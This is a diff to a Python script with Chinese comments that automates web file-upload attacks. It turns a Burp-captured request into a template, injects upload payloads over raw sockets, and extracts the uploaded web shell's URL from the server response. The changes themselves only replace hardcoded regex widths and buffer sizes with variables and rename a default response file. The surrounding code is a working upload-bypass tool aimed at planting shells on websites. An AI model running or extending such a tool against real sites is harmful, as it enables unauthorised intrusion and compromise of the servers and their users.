@@ -2,6 +2,8 @@ import socket
 import requests
 import re
 import os
+shell_re_chars=15 #根据标记内容的前后10个字符生成正则表达式,如果有多个匹配项请增加该值
+receive_size=256000 #接收数据的大小,如果网页较大无法接收到响应包返回的文件url可适当调大
 
 def fmtRequest(requestFilePath):#该函数的作用是格式化请求包,将请求包转换为通用模板,方便插入payload,详见request_template.txt
                                 #代码写的比较乱,不仔细看我自己都看不懂...还好实现了功能...
@@ -36,8 +38,8 @@ def fmtRequest(requestFilePath):#该函数的作用是格式化请求包,将请�
 def fmtResponse(responseFilePath):#该函数的作用是找到你标记的文件url,生成用于匹配该路径的正则表达式(取[[[[...]]]]前后10个字符,中间为.*)
     data=open(responseFilePath,"rb")
     a=data.read().decode(errors="ignore")
-    shell_re_left=a[a.find("[[[[")-10:a.find("[[[[")]
-    shell_re_right=a[a.find("]]]]")+4:a.find("]]]]")+14]
+    shell_re_left=a[a.find("[[[[")-shell_re_chars:a.find("[[[[")]
+    shell_re_right=a[a.find("]]]]")+4:a.find("]]]]")+4+shell_re_chars]
     shell_re=shell_re_left+".*"+shell_re_right
     return shell_re
     
@@ -56,7 +58,7 @@ def uploadAttachment(host,port,request_template,attachmentPath,attachmentType,ht
     sock = socket.socket()
     sock.connect((url,int(port)))
     sock.send(request_data)
-    sock.recv(256000)
+    sock.recv(receive_size)
         
 def sendPayload(host,port,request_template,payload,shell_re,base_url,https=False,custom_Y="",custom_N=""):#该函数用于替换模板并发送请求到服务器
     tmp=payload.split("||||")#分割每一项
@@ -89,7 +91,7 @@ def sendPayload(host,port,request_template,payload,shell_re,base_url,https=False
     sock.send(request_data)
     data=bytes("","utf-8")
     
-    data = data + sock.recv(256000)#接收数据的大小,如果网页较大无法接收到响应包返回的文件url可适当调大
+    data = data + sock.recv(receive_size)
     tmp=data.decode(errors="ignore")
     if custom_Y !="":#如果有自定义条件则对自定义条件的满足性进行判断,逻辑比较复杂,无法处理&和|同时存在的情况....
         if "|" in custom_Y:
@@ -188,7 +190,7 @@ def sendPayload(host,port,request_template,payload,shell_re,base_url,https=False
         print("\r[失败]"+name+"\n[原因]无法上传\n")
         return False
     else:
-        shell_url=match[0][10:-10]#删去多余的前后字符
+        shell_url=match[0][shell_re_chars:-shell_re_chars]#删去多余的前后字符
         shell_name=shell_url[shell_url.rfind("/")+1:]#取出服务器返回的文件名
         
         if extension != "[AUTO]":#如果指定了扩展名则对文件扩展名进行更改
@@ -230,7 +232,7 @@ if __name__ == '__main__':
     
     requestFilePath="request.txt"                    #请求包文件路径,brup抓包,repeater->copy to file
     
-    responseFilePath="custom_response.txt"                   #响应包文件路径,burp抓包,repeater->copy to file,用[[[[]]]]标记响应包中返回的上传文件的路径
+    responseFilePath="response.txt"                   #响应包文件路径,burp抓包,repeater->copy to file,用[[[[]]]]标记响应包中返回的上传文件的路径
     
     https=False                            #网站是否开启https,默认关闭
     
